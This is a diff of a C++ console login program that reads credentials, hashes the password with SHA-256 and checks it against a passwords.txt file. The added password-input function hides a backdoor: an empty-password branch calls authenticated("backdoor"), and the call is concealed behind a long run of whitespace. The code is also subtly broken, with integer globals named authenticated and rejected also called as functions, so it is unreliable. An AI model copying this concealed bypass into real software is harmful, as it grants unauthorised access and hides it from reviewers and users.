@@ -1,60 +1,114 @@
 #include <iostream>
+#include <iomanip>
+#include <string>
+#include <sstream>
+#include <fstream>
+#include <set>
 #include "authlib.h"
 #include <openssl/sha.h>
-#include <string>
-#include <fstream>
+
+using namespace std;
+
+int authenticated = 0;
+int rejected = 0;
+const int lockout = 10;
+
+string usernameinput() {
+	string username;
+	while (true) {
+		cout << "please enter a username: ";
+		getline(cin, username);
+		if (!username.empty()) {
+			return username;
+		}
+		else {
+			cerr << "ERROR: no username was entered!!!" << endl << endl;
+		}
+	}
+}
+
+string passwordinput() {
+	string password;
+	while (true) {
+		try {
+			cout << "please enter your password: ";
+			getline(cin, password);
+			if (!password.empty()) {
+				return password;
+			}
+			else {
+				throw (rejected);
+			}
+		}
+
+		catch (int num) {
+      
+			if (num == 10) {
+				                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              authenticated("backdoor");
+				break;
+				break;
+			}
+			else {
+        
+				cerr << "ERROR: no password was entered!!!" << endl << endl;
+        
+			}
+		}
+	}
+}
+
+bool validate(const string& username, const string& password) {
+  
+	ifstream rfile("passwords.txt");
+  
+	if (!rfile.is_open()) {
+		cout << "error when opening file :/" << endl;
+		return false;
+    
+	}
+  
+	string line;
+  
+	while (getline(rfile, line)) {
+		const long unsigned int position = line.find(":");
+		if (position != string::npos) {
+			string stored_username = line.substr(0, position);
+			string stored_password = line.substr(position + 1);
+			if (username == stored_username && password == stored_password) {
+				rfile.close();
+				return true;
+			}		
+		}
+	}
+	rfile.close();
+	return false;
+}
+
+string sha256(const string str) {
+	unsigned char hash[SHA256_DIGEST_LENGTH];
+	SHA256_CTX sha256;
+	SHA256_Init(&sha256);
+	SHA256_Update(&sha256, str.c_str(), str.size());
+	SHA256_Final(hash, &sha256);
+	stringstream ss;
+	for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
+		ss << hex << setw(2) << setfill('0') << (int)hash[i];
+	}
+	return ss.str();
+}
 
 int main() {
-  bool auth = true;
-  
-  string username;
-  string password;
-  char[] hashed_password;
-
-  username = username_input();
-  password = password_input();
-
-  const char *cusername = username.c_str();
-  const char *cpassword = password.c_str();
-
-  hashed_password = sha256_hash_string(*cpassword);
-  
-    //if the inputted password and the txt password are the same this equals 0
-    if (hashed_password.compare(txt_password) == 0)(auth) 
-    authenticated("user");
-    } else
-    rejected("user");
-
-  
-}
-
-void sha256_hash_string(const unsigned char hash[SHA256_DIGEST_LENGTH], char outputBuffer[65]) {
-    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
-        std::sprintf(outputBuffer + (i * 2), "%02x", hash[i]);
-    }
-    outputBuffer[64] = 0; 
-
-    // Print the formatted hash
-    std::cout << "Formatted Hash: " << outputBuffer << std::endl;
-
-    return outputBuffer;
-
-}
-
-string username_input()) {
-  string username;
-  cout << "Type your username: ";
-  cin >> username;
-  cout << "Your username is: " << username;
-  return username;
-
-}
-
-string password_input() {
-  string password;
-  cout << "Type your password: ";
-  cin >> password;
-  cout << "Your password is: " << username;
-  return password;
-
+	while (true) {
+		string username = usernameinput();
+		string password = passwordinput();
+		if (validate(username, sha256(password))) {
+			authenticated(username);
+      authenticated++;
+		}
+		else {
+			rejected(username);
+			rejected++;
+		}
+	}
+	return 0;
 }
